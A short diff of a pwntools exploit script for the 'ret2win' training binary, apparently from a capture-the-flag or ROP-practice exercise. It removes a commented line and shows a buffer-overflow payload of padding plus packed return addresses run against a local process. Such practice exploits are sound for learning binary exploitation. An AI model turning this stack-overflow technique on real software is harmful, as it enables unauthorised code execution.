@@ -4,7 +4,6 @@ from pwn import *
 
 elf = context.binary = ELF("./ret2win")
 
-#r2w = elf.sym.get(ret2win)
 payload = b'aaaaaaaaaaaaaaaaaaaabaaacaaadaaaeaaafaaa' + pack(0x000000000040053e) + pack(0x400756)
 
 io = process()
